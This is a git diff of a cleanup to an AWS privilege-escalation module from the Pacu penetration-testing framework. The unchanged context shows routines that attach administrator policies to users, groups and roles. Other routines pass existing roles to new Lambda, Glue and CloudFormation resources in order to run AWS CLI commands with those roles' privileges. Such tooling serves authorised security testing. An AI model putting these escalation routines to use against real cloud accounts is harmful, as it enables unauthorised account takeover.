@@ -6,7 +6,9 @@ from copy import deepcopy
 import json
 import os
 import re
+import random
 import time
+import subprocess
 
 
 module_info = {
@@ -902,7 +904,7 @@ def CreateEC2WithExistingIP(pacu_main, print, input, fetch_data):
                 return False
         elif method == 4:
             # Create SSH key
-            ssh_key_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+            ssh_key_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
             try:
                 response = client.create_key_pair(
                     KeyName=ssh_key_name,
@@ -1165,6 +1167,7 @@ def AttachRolePolicy(pacu_main, print, input, fetch_data):
         print('  Failed to attach an administrator policy to role {}: {}\n'.format(target_role, error))
         return False
 
+
 def PutUserPolicy(pacu_main, print, input, fetch_data):
     session = pacu_main.get_active_session()
     active_aws_key = session.get_active_aws_key(pacu_main.database)
@@ -1175,7 +1178,7 @@ def PutUserPolicy(pacu_main, print, input, fetch_data):
 
     print('Trying to add an administrator policy to the current user...\n')
 
-    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    policy_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
     try:
         client.put_user_policy(
             UserName=active_aws_key.user_name,
@@ -1208,7 +1211,7 @@ def PutGroupPolicy(pacu_main, print, input, fetch_data):
 
     print('Targeting group {}. Trying to add an administrator policy to it...'.format(target_group))
 
-    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    policy_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
     try:
         client.put_group_policy(
             GroupName=target_group,
@@ -1245,7 +1248,7 @@ def PutRolePolicy(pacu_main, print, input, fetch_data):
 
     print('Targeting role {}. Trying to add an administrator policy to it...'.format(target_role))
 
-    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    policy_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
     try:
         client.put_role_policy(
             RoleName=target_role,
@@ -1305,8 +1308,6 @@ def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
 
     print('  Starting method UpdateRolePolicyToAssumeIt...\n')
 
-    client = pacu_main.get_boto3_client('iam')
-
     target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
 
     if not target_role:
@@ -1341,7 +1342,7 @@ def UpdateRolePolicyToAssumeIt(pacu_main, print, input, fetch_data):
 
 def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
     print('  Starting method PassExistingRoleToNewLambdaThenInvoke...\n')
-    
+
     try:
         function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data)
         print('To make use of the new privileges, you need to invoke the newly created function. The function accepts input in the format as follows:\n\n{"cmd": "<aws cli command>"}\n\nWhen invoking the function, pass that JSON object as input, but replace <aws cli command> with an AWS CLI command that you would like to execute in the context of the role that was passed to this function.\n\nAn example situation would be where the role you passed has S3 privileges, so you invoke this newly created Lambda function with the input {"cmd": "aws s3 ls"} and it will respond with all the buckets in the account.\n')
@@ -1356,7 +1357,7 @@ def PassExistingRoleToNewLambdaThenInvoke(pacu_main, print, input, fetch_data):
 
 def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input, fetch_data):
     print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithNewDynamo...\n')
-    
+
     # Create Lambda function
     try:
         function_name, region = pass_existing_role_to_lambda(pacu_main, print, input, fetch_data)
@@ -1365,8 +1366,8 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
         return False
 
     client = pacu_main.get_boto3_client('dynamodb', region)
-    dynamo_table_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
-    
+    dynamo_table_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
     # Create DynamoDB table
     try:
         response = client.create_table(
@@ -1419,6 +1420,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithNewDynamo(pacu_main, print, input,
     print('WARNING: This method does not directly return the output of your AWS CLI command, but there are a couple different options you can take:\n  1. Only run commands that you do not need the output of (such as attaching a policy to your user).\n  2. Review the CloudWatch logs relating to your function invocations, if you have permissions to do so.\n')
     return True
 
+
 def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, input, fetch_data):
     print('  Starting method PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo...\n')
 
@@ -1427,7 +1429,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
     target_region = None
     if len(regions) == 0:
         all_dynamodbstreams_regions = pacu_main.get_regions('dynamodbstreams', check_session=False)
-        while not region:
+        while not target_region:
             target_region = input('  No valid regions found that the current set of session regions supports. Enter in a region (example: us-west-2) or press enter to skip to the next privilege escalation method: ')
             if not target_region:
                 return False
@@ -1443,7 +1445,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
         streams = client.list_streams()['Streams']
         if len(streams) > 0:
             all_streams[region] = streams
-    
+
     if len(all_streams.keys()) > 1:
         print('Found {} regions with DynamoDB streams. These are what will trigger your Lambda function, which ultimately leads to you getting credentials. Choose which region below to create the Lambda function in.'.format(len(all_streams.keys())))
         for i in range(0, len(all_streams.keys())):
@@ -1487,7 +1489,7 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
         print('Failed to create a new Lambda function: {}\n'.format(error))
         return False
 
-    # Set Lambda concurrency limit
+    # Set Lambda concurrency limit (Success or fail won't change what happens next, so ignore it)
     client = pacu_main.get_boto3_client('lambda', region)
     try:
         client.put_function_concurrency(
@@ -1522,11 +1524,11 @@ def PassExistingRoleToNewLambdaThenTriggerWithExistingDynamo(pacu_main, print, i
 
 def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='', region=None):
     session = pacu_main.get_active_session()
-    
+
     if zip_file == '':
         zip_file = './modules/{}/lambda.zip'.format(module_info['Name'])
-    
-    if region == None:
+
+    if region is None:
         regions = pacu_main.get_regions('lambda')
 
         if len(regions) > 1:
@@ -1565,13 +1567,14 @@ def pass_existing_role_to_lambda(pacu_main, print, input, fetch_data, zip_file='
         target_role_arn = roles[int(choice)]['Arn']
 
     print('Using role {}. Trying to create a new Lambda function...'.format(target_role_arn))
-    
-    function_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
-    
+
+    function_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
+
     with open(zip_file, 'rb') as f:
         lambda_zip = f.read()
 
-    response = client.create_function(
+    # Put the error handling in the function calling this function
+    client.create_function(
         FunctionName=function_name,
         Runtime='python3.6',
         Role=target_role_arn,
@@ -1634,7 +1637,7 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
         choice = input('Choose an option: ')
         target_role_arn = roles[int(choice)]['Arn']
 
-    dev_endpoint_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    dev_endpoint_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
     print('Creating Glue development endpoint {} in region {}...\n'.format(dev_endpoint_name, region))
 
     try:
@@ -1663,7 +1666,6 @@ def PassExistingRoleToNewGlueDevEndpoint(pacu_main, print, input, fetch_data):
     except Exception as error:
         print('Failed to create the Glue development endpoint {}: {}\n'.format(dev_endpoint_name, error))
         return False
-
 
 
 def UpdateExistingGlueDevEndpoint(pacu_main, print, input, fetch_data):
@@ -1754,7 +1756,7 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
                 region = None
 
     client = pacu_main.get_boto3_client('cloudformation', region)
-    stack_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    stack_name = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
 
     template = None
     while not template:
@@ -1802,13 +1804,13 @@ def PassExistingRoleToNewCloudFormation(pacu_main, print, input, fetch_data):
                 'Delay': 20
             }
         )
-        
+
         response = client.describe_stacks(
             StackName=stack_name
         )
         print('Stack finished creation. Here is the output:\n')
         print(response['Stacks'])
-        
+
         print('Your CloudFormation resources should have been created and you should have received the output from the stack creation.\n')
         return True
     except Exception as error:
@@ -1821,8 +1823,6 @@ def PassExistingRoleToNewDataPipeline(pacu_main, print, input, fetch_data):
 
 
 def EditExistingLambdaFunctionWithRole(pacu_main, print, input, fetch_data):
-    session = pacu_main.get_active_session()
-
     print('  Starting method EditExistingLambdaFunctionWithRole...\n')
 
     if fetch_data(['Lambda', 'Functions'], 'enum_lambda', '', force=True) is False:
